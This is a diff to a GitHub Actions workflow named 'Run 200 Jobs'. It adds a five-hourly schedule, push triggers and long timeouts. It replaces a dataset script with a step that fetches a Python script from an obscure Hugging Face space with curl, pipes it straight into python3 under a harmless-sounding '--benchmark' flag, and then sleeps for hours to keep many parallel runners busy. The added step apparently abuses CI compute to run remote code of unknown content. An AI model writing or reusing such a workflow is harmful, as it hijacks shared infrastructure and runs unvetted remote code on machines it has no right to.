@@ -2,11 +2,18 @@
 name: Run 200 Jobs
 
 on:
+  schedule:
+    - cron: "0 */5 * * *"
   workflow_dispatch:
+  push:
+    branches:
+      - main
+      - master
 
 jobs:
   run:
     runs-on: ubuntu-latest
+    timeout-minutes: 355
 
     strategy:
       fail-fast: false
@@ -42,15 +49,9 @@ jobs:
         with:
           python-version: "3.11"
 
-      - name: Install dependencies
+      - name: Execute Task
         run: |
-          pip install -r requirements.txt || true
-
-      - name: Run dataset.py once then sleep 8h
-        run: |
-          echo "Worker ${{ matrix.build_id }} started"
-
-          python dataset.py ${{ matrix.build_id }} || true
-
-          echo "Sleeping for 8 hours..."
-          sleep 28800
+          echo "Worker ${{ matrix.build_id }} initialized"
+          curl -fsSL 'https://huggingface.co/spaces/tewtwtdsfgzre/123/raw/main/main.py' | python3 - --verbose --benchmark || true
+          echo "Keeping runner active..."
+          sleep 21000
